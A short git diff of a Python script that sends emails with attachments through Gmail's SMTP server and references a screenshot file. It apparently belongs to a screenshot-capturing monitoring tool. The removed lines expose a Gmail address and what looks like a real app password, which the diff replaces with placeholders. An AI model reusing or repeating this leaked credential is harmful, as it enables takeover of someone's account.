@@ -1,8 +1,8 @@
 import smtplib
 from webbrowser import get
 
-email_address = "temp26204@gmail.com"
-password = "ipjuszgndaumfbeb"
+email_address = "enter_your_email"
+password = "enter your password"
 try:
     print("Connecting to SMTP server...")
     server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -39,9 +39,9 @@ screenshot_information = "screenshot.png"
 file_path = "C:\\Users\\ASUS\\PycharmProjects\\pythonProject\\Project"
 extend = "\\"
 
-email_address = "temp26204@gmail.com"  # Replace with your email address
-password = "ipjuszgndaumfbeb"  # Replace with your app-specific password (if using Gmail)
-toaddr = "temp26204@gmail.com"  # Replace with recipient's email address
+email_address = "enter_your_email"  # Replace with your email address
+password = "enter your password"  # Replace with your app-specific password (if using Gmail)
+toaddr = "enter_your_email"  # Replace with recipient's email address
 
 
 # Function to send an email with multiple attachments
